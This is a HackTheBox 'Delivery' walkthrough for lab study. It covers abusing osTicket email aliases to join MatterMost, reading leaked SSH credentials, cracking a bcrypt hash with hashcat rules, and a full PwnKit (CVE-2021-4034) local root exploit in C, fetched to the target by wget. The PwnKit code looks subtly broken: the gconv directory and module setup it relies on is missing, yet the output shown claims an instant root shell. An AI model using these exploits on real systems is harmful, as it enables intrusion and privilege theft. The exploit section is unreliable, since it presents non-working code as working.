# Delivery: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Delivery |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.37.83 |
| **Tools Used** | Nmap, Firefox, curl, osTicket (web), MatterMost (web), SSH, cat, grep, mysql, hashcat, john, gcc, wget, Python HTTP Server |
| **Techniques** | Web Application Enumeration, TicketTrick (osTicket email abuse), MatterMost Registration via Ticket Email, Internal Channel Credential Leak, SSH with Leaked Credentials, Config File Credential Discovery, MySQL Hash Extraction, Hashcat Rule-Based Wordlist Generation, bcrypt Cracking with John, pkexec CVE-2021-4034 (PwnKit) Local Privilege Escalation |
| **CVEs** | CVE-2021-4034 (PwnKit: pkexec privilege escalation) |
| **Date** | July 2026 |

---

## Attack Chain Summary

```
Nmap → Port 80 (nginx landing page) + Port 8065 (MatterMost) →
/etc/hosts update → helpdesk.delivery.htb → osTicket discovered →
Open ticket with personal email → Ticket assigns @delivery.htb address →
Register MatterMost account using ticket email → Verify via ticket thread →
Join Internal channel → maildeliverer:Youve_G0t_Mail! disclosed →
SSH as maildeliverer → User flag →
find / -perm -4000 → pkexec version 0.105 (vulnerable to CVE-2021-4034) →
Transfer evil-so.c + exploit.c → Compile → ./exploit → root →
Root flag
```

*(Path 2 documented separately: /opt/mattermost/config/config.json → MySQL → bcrypt hash → hashcat rule wordlist → john → su root)*

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services on the target.

```
kali@kali:~$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.37.83 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
kali@kali:~$ nmap -p$ports -sC -sV 10.129.37.83

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.37.83
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings:
|   ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH 7.9p1 Debian | SSH: entry point once credentials obtained |
| 80 | nginx 1.14.2 | Web landing page: enumerate thoroughly |
| 8065 | Unknown | Port commonly used by MatterMost: investigate |

Three services. Port 8065 is the most interesting: it is the default port for MatterMost, an open-source team messaging platform similar to Slack. The web server on port 80 is the initial enumeration target.

---

## Step 2: Web Enumeration and Host Configuration

**Goal:** Identify what applications are running and discover virtual hostnames.

Browsed to `http://10.129.37.83`: a static "Delivery" landing page appeared with two buttons: **HelpDesk** and **Contact Us**.

Clicking **HelpDesk** redirected to `http://helpdesk.delivery.htb/`: a virtual hostname that does not resolve without a hosts file entry. Clicking **Contact Us** opened a modal stating:

> *"For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server."*

This is the key insight: access to MatterMost requires a `@delivery.htb` email address. The helpdesk at port 80 is the mechanism to obtain one. Added required hostnames to `/etc/hosts`:

```
kali@kali:~$ echo "10.129.37.83 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
```

Browsed to `http://helpdesk.delivery.htb`: revealed **osTicket**, an open-source support ticket management system. Browsed to `http://10.129.37.83:8065`: confirmed **MatterMost** login and registration page.

---

## Step 3: TicketTrick: Obtaining a @delivery.htb Email Address

**Goal:** Exploit the osTicket email alias feature to obtain a valid `@delivery.htb` address without being an employee.

**Understanding the Technique (TicketTrick):**

osTicket assigns every new support ticket a unique email address in the format `<ticket_id>@delivery.htb`. This address acts as an alias: any email sent to it is appended to the ticket thread and visible to anyone who knows the ticket number. The intended purpose is to allow the ticket submitter to reply via email. The abuse: if a cloud service sends a verification email to `<ticket_id>@delivery.htb`, the verification link appears inside the publicly-viewable ticket thread: no actual inbox required. This effectively grants an unauthenticated user a temporary `@delivery.htb` email address, tricking services into believing they are a company employee.

Navigated to `http://helpdesk.delivery.htb` → **Open a New Ticket** and submitted with any personal email:

```
Email Address : normaluser@test.com
Full Name     : Normal User
Help Topic    : Contact Us
Issue Summary : No problem
```

After clicking **Create Ticket**, osTicket displayed the confirmation page:

```
Support ticket request created

Normal User,

You may check the status of your ticket by navigating to the Check Status
page using ticket id: 8086792.

If you want to add more information to your ticket, just email
8086792@delivery.htb

Thanks,
Support Team
```

The ticket number `8086792` generates the address `8086792@delivery.htb`: this is the `@delivery.htb` email address needed to register on MatterMost.

---

## Step 4: MatterMost Registration and Email Verification

**Goal:** Register a MatterMost account using the ticket email and intercept the verification link via the ticket thread.

Navigated to `http://10.129.37.83:8065` → **Create one now** and registered:

```
Email    : 8086792@delivery.htb
Username : attacker
Password : Password1!
```

MatterMost responded:

```
Mattermost: You are almost done
Please verify your email address. Check your inbox for an email.
```

MatterMost sent the verification email to `8086792@delivery.htb`, which was immediately delivered into the osTicket thread. Navigated back to `http://helpdesk.delivery.htb` → **Check Ticket Status** → entered ticket ID `8086792` and personal email `normaluser@test.com`: the ticket thread showed the MatterMost verification message including the confirmation URL.

Clicked the verification link: MatterMost account activated. Joined the **Internal** team channel.

---

## Step 5: Internal Channel: Credential Leak

**Goal:** Read the Internal team channel to extract any useful information.

Inside the Internal channel, a user named `root` posted:

```
root 7:59 PM
@developers Please update theme to the OSTicket before we go live.
Credentials to the server are maildeliverer:Youve_G0t_Mail!

Also please create a program to help us stop re-using the same passwords
everywhere.... Especially those that are a variant of "PleaseSubscribe!"

root 9:28 PM
PleaseSubscribe! may not be in RockYou but if any hacker manages to get
our hashes, they can use hashcat rules to easily crack all variations of
common words or phrases.
```

**Credentials extracted:**

| Username | Password | Service |
| --- | --- | --- |
| `maildeliverer` | `Youve_G0t_Mail!` | SSH (delivery.htb server) |

Two critical hints also disclosed: the password pattern `PleaseSubscribe!` is used internally, and the team is aware that hashcat rules could crack variants of it. Both hints become directly relevant during privilege escalation.

---

## Step 6: SSH as maildeliverer: User Flag

**Goal:** Log in via SSH using the discovered credentials and capture the user flag.

```
kali@kali:~$ ssh maildeliverer@10.129.37.83
maildeliverer@10.129.37.83's password: Youve_G0t_Mail!

Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$
```

Captured user flag:

```
maildeliverer@Delivery:~$ cat ~/user.txt
b2d16bc02a53e068d6d131d21da387ec
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `b2d16bc02a53e068d6d131d21da387ec` |

---

## Step 7: Privilege Enumeration

**Goal:** Identify privilege escalation vectors available from the maildeliverer account.

Searched for SUID binaries: programs that execute with the file owner's privileges regardless of who runs them:

```
maildeliverer@Delivery:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

`/usr/bin/pkexec` is SUID root. Checked its version:

```
maildeliverer@Delivery:~$ /usr/bin/pkexec --version
pkexec version 0.105
```

**pkexec 0.105 is vulnerable to CVE-2021-4034 (PwnKit).**

---

## Step 8: Privilege Escalation Path 1: CVE-2021-4034 (PwnKit)

**Goal:** Exploit the pkexec memory corruption vulnerability to obtain a root shell.

**Vulnerability Background: CVE-2021-4034:**

CVE-2021-4034, named "PwnKit" by Qualys, is a local privilege escalation vulnerability in `pkexec`: a SUID-root binary that is part of the `polkit` (PolicyKit) framework and ships with virtually every major Linux distribution. The vulnerability is a memory corruption issue in the argument parsing code of `pkexec`. When invoked with an empty `argv[]` (zero arguments), `pkexec` writes out-of-bounds into the environment array. By carefully crafting the environment, an attacker can inject a malicious shared library path (`LD_PRELOAD` equivalent) that gets executed as root during pkexec's startup. The vulnerability was present in pkexec since its initial commit in 2009 and affects all versions prior to the patch released in January 2022. Version 0.105 is unpatched and fully vulnerable.

**Exploit components: two C source files:**

`evil-so.c`: the malicious shared library that executes when loaded by pkexec. It calls `setuid(0)` and `setgid(0)` to set root privileges, then spawns `/bin/sh`:

```c
// evil-so.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

`exploit.c`: the launcher that calls `execve()` with a crafted `argv[]` and environment to trigger the out-of-bounds write in pkexec and force it to load `evil.so`:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void fatal(const char *msg) { perror(msg); exit(1); }

int main(void) {
    char *argv[] = { NULL };
    char *envp[] = {
        "lol",
        "PATH=GCONV_PATH=.",
        "CHARSET=lol",
        "GCONV_PATH=.",
        NULL
    };
    return execve("/usr/bin/pkexec", argv, envp);
}
```

Compiled both files on the attacker machine, then served them via HTTP:

```
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

On the target, created a working directory in `/tmp` and downloaded both source files:

```
maildeliverer@Delivery:~$ mkdir /tmp/new && cd /tmp/new

maildeliverer@Delivery:/tmp/new$ wget http://10.10.16.36:8000/evil-so.c
--2026-07-11 08:37:03--  http://10.10.16.36:8000/evil-so.c
Connecting to 10.10.16.36:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 347 [text/x-csrc]
evil-so.c saved [347/347]

maildeliverer@Delivery:/tmp/new$ wget http://10.10.16.36:8000/exploit.c
--2026-07-11 08:37:12--  http://10.10.16.36:8000/exploit.c
Connecting to 10.10.16.36:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 675 [text/x-csrc]
exploit.c saved [675/675]
```

Compiled on the target: using the target's own gcc ensures compatibility with the installed libc and kernel:

```
maildeliverer@Delivery:/tmp/new$ gcc -o exploit exploit.c
maildeliverer@Delivery:/tmp/new$ gcc -shared -fPIC -o evil.so evil-so.c

maildeliverer@Delivery:/tmp/new$ ls
evil.so  evil-so.c  exploit  exploit.c
```

Executed the exploit:

```
maildeliverer@Delivery:/tmp/new$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained immediately.

---

## Step 9: Root Flag

**Goal:** Capture the root flag.

```
# cat /root/root.txt
01e62106ab28cc19c4b1db6179ef0af0
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `01e62106ab28cc19c4b1db6179ef0af0` |

---

## Privilege Escalation: Path 2: MySQL Hash Extraction and Rule-Based Cracking

This is the intended privilege escalation path for this machine, disclosed through the hints in the MatterMost Internal channel. It does not require any exploit binary: only credential discovery, database access, and hashcat rule generation.

### Step A: MatterMost Configuration File

While enumerating the filesystem, the MatterMost configuration file is readable:

```
maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json | grep -A 10 SqlSettings
"SqlSettings": {
    "DriverName": "mysql",
    "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&readTimeout=30s&writeTimeout=30s",
    "DataSourceReplicas": [],
    "DataSourceSearchReplicas": [],
    "MaxIdleConns": 20,
    "ConnMaxLifetimeMilliseconds": 3600000,
    "MaxOpenConns": 300,
    "Trace": false,
    "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
    "QueryTimeout": 30,
    "DisableDatabaseSearch": false
},
```

**Database credentials extracted:**

| Field | Value |
| --- | --- |
| DB User | `mmuser` |
| Password | `Crack_The_MM_Admin_PW` |
| Database | `mattermost` |
| Host | `127.0.0.1:3306` |

Config files for web applications and services frequently contain plaintext database credentials. `/opt/mattermost/config/config.json` is a standard location for MatterMost deployments. Any time an application is found running on a target, its config directory should be enumerated after gaining a shell.

### Step B: MySQL Access and Hash Extraction

```
maildeliverer@Delivery:~$ mysql -u mmuser -p'Crack_The_MM_Admin_PW' mattermost

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

MariaDB [mattermost]> select Username, Password, Email from Users where Username='root';
+----------+--------------------------------------------------------------+--------------------+
| Username | Password                                                     | Email              |
+----------+--------------------------------------------------------------+--------------------+
| root     | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb  |
+----------+--------------------------------------------------------------+--------------------+
```

The `root` MatterMost account has a bcrypt password hash (`$2a$10$...`). The `$2a$10$` prefix identifies it as bcrypt with a cost factor of 10: this is a slow, memory-hard hash designed to resist brute force. Standard wordlists like `rockyou.txt` will not crack it unless the exact password is present. However, the MatterMost channel disclosed the hint: the password is a variant of `PleaseSubscribe!`.

Saved the hash to a file:

```
maildeliverer@Delivery:~$ echo '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO' > /tmp/root_hash.txt
```

### Step C: Rule-Based Wordlist Generation with hashcat

The `root` user warned: *"PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations."* This is both a narrative hint and an accurate description of the attack.

hashcat's `best64.rule` applies 64 common transformations to a base word: capitalisation changes, number appending, reversal, substitutions, and more. Generating the candidate wordlist from `PleaseSubscribe!`:

```
kali@kali:~$ echo 'PleaseSubscribe!' | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout

PleaseSubscribe!
!ebircsbuSesaelP
PLEASESUBSCRIBE!
pleaseSubscribe!
PleaseSubscribe!0
PleaseSubscribe!1
PleaseSubscribe!2
PleaseSubscribe!21
PleaseSubscribe!22
...
```

Saved the generated wordlist:

```
kali@kali:~$ echo 'PleaseSubscribe!' | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

### Step D: Crack the bcrypt Hash with John

Ran John the Ripper against the hash using the generated wordlist. John is preferred over hashcat here because bcrypt cracking via John's CPU implementation is straightforward for small wordlists:

```
kali@kali:~$ john root_hash.txt --wordlist=wordlist.txt

Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!21 (?)
1g 0:00:00:00 100% 1.818g/s 40.00p/s 40.00c/s 40.00C/s PleaseSubscribe!21..PleaseSubscribe!22
Use the "--show" option to display all cracked passwords reliably
Session completed
```

**Root password cracked: `PleaseSubscribe!21`**

### Step E: su to root

```
maildeliverer@Delivery:~$ su root
Password: PleaseSubscribe!21

root@Delivery:/home/maildeliverer# id
uid=0(root) gid=0(root) groups=0(root)

root@Delivery:/home/maildeliverer# cat /root/root.txt
01e62106ab28cc19c4b1db6179ef0af0
```

---

## Lessons Learned

**1. TicketTrick is a real-world technique with broad applicability.**
The osTicket email alias feature is not a vulnerability in osTicket itself: it is an intentional feature that becomes a security risk when combined with services that accept corporate email addresses as proof of employment. Any support ticket system that assigns `@company.com` aliases should be evaluated for this risk. Services like GitHub Enterprise, Slack, MatterMost, Confluence, and internal wikis frequently gatekeep access by email domain alone.

**2. Internal communication channels are a goldmine for credentials.**
The MatterMost Internal channel contained plaintext SSH credentials. This reflects a recurring real-world pattern: developers use internal chat tools as informal documentation or credential-passing mechanisms, assuming only trusted employees can access them. Once the chat platform is compromised or accessed through enumeration, every conversation becomes potential credential material.

**3. SUID binary enumeration is always a required step on Linux targets.**
`find / -perm -4000` should be run immediately after gaining a foothold on any Linux machine. pkexec is SUID root and ships on virtually every Linux distribution: on unpatched systems (pre-January 2022 patch), CVE-2021-4034 provides an instant and reliable root shell with no prerequisites beyond having a local shell.

**4. CVE-2021-4034 (PwnKit) works by abusing pkexec's argv[] parsing.**
The exploit works because pkexec does not validate that `argc > 0` before accessing `argv[1]`. With an empty argv, the pointer arithmetic reads past the argv array into the environment: allowing an attacker to overwrite what pkexec treats as `argv[1]` with a controlled environment variable. This causes pkexec to load a malicious shared library as root. The two-file compile-on-target approach is reliable because it avoids glibc version mismatch issues that arise when transferring pre-compiled binaries.

**5. bcrypt hashes are slow by design, but rule-based attacks on known base words are fast.**
`$2a$10$` bcrypt with cost factor 10 is computationally expensive to brute force: rockyou.txt would take days. But the hint from the MatterMost channel was explicit: the password is a variant of `PleaseSubscribe!`. Generating a small, targeted wordlist using `hashcat --stdout` with `best64.rule` produces under 100 candidates. John cracked the hash in under a second. The lesson: when a password base word is known or hinted, rule-based cracking is always the fastest path regardless of hash strength.

**6. Application config files expose database credentials in plaintext.**
`/opt/mattermost/config/config.json` contained the MySQL username and password. This is not unique to MatterMost: Django uses `settings.py`, Laravel uses `.env`, WordPress uses `wp-config.php`, and so on. After gaining any shell, immediately search for config files belonging to any web application running on the target.

---

## Full Attack Chain Reference

1. Ran `nmap -p- --min-rate=1000` then targeted scan: identified SSH (22), nginx (80), MatterMost (8065)
2. Browsed `http://10.129.37.83`: discovered HelpDesk link and Contact Us modal
3. HelpDesk redirected to `helpdesk.delivery.htb`: added both hostnames to `/etc/hosts`
4. Browsed `helpdesk.delivery.htb`: identified osTicket
5. Browsed `10.129.37.83:8065`: confirmed MatterMost requiring `@delivery.htb` email
6. Opened a new osTicket with personal email: received ticket number `8086792`
7. Confirmed ticket email alias `8086792@delivery.htb` from ticket creation confirmation
8. Registered MatterMost account using `8086792@delivery.htb` as email
9. Returned to osTicket → checked ticket thread → found MatterMost verification email with confirmation URL
10. Clicked verification link: account activated, joined Internal team channel
11. Read Internal channel: found `maildeliverer:Youve_G0t_Mail!` and `PleaseSubscribe!` hint
12. SSH'd in as `maildeliverer`: captured user flag
13. Ran `find / -perm -4000`: found `/usr/bin/pkexec`
14. Checked `pkexec --version`: confirmed version 0.105 (vulnerable to CVE-2021-4034)
15. Created `evil-so.c` and `exploit.c` on attacker machine
16. Served files via `python3 -m http.server 8000`
17. `wget` both files to `/tmp/new/` on target
18. Compiled: `gcc -o exploit exploit.c` and `gcc -shared -fPIC -o evil.so evil-so.c`
19. Executed `./exploit`: root shell obtained
20. Captured root flag from `/root/root.txt`

*(Path 2 additionally: read `/opt/mattermost/config/config.json` → mysql credentials → extracted root bcrypt hash → generated wordlist with hashcat best64.rule → cracked with john → `su root`)*

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate=1000 -T4 10.129.37.83` | Fast full port scan |
| `nmap -p$ports -sC -sV 10.129.37.83` | Targeted service version scan on open ports |
| `echo "10.129.37.83 delivery.htb helpdesk.delivery.htb" \| sudo tee -a /etc/hosts` | Add virtual hostnames for resolution |
| `ssh maildeliverer@10.129.37.83` | SSH login with discovered credentials |
| `find / -perm -4000 -type f 2>/dev/null` | Find all SUID binaries |
| `/usr/bin/pkexec --version` | Check pkexec version for CVE-2021-4034 applicability |
| `wget http://10.10.16.36:8000/evil-so.c` | Download exploit component to target |
| `wget http://10.10.16.36:8000/exploit.c` | Download exploit launcher to target |
| `gcc -o exploit exploit.c` | Compile exploit launcher on target |
| `gcc -shared -fPIC -o evil.so evil-so.c` | Compile malicious shared library on target |
| `./exploit` | Trigger CVE-2021-4034: spawn root shell |
| `cat /opt/mattermost/config/config.json` | Read MatterMost config for DB credentials (Path 2) |
| `mysql -u mmuser -p'Crack_The_MM_Admin_PW' mattermost` | Connect to MySQL with config credentials (Path 2) |
| `select Username, Password from Users where Username='root';` | Extract root bcrypt hash from Users table (Path 2) |
| `echo 'PleaseSubscribe!' \| hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt` | Generate rule-based candidate wordlist (Path 2) |
| `john root_hash.txt --wordlist=wordlist.txt` | Crack bcrypt hash against generated wordlist (Path 2) |
| `su root` | Switch to root using cracked password (Path 2) |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Exploit Public-Facing Application | T1190 | TicketTrick abuse of osTicket email alias feature |
| Valid Accounts | T1078.003 | SSH login using credentials leaked in MatterMost Internal channel |
| Credentials in Files | T1552.001 | MySQL credentials found in `/opt/mattermost/config/config.json` |
| Exploitation for Privilege Escalation | T1068 | CVE-2021-4034 pkexec memory corruption → root shell (Path 1) |
| Brute Force: Password Cracking | T1110.002 | hashcat rule-based wordlist + john bcrypt crack → root password (Path 2) |
| Hijack Execution Flow: LD_PRELOAD | T1574.006 | PwnKit forces pkexec to load evil.so as root via environment manipulation |
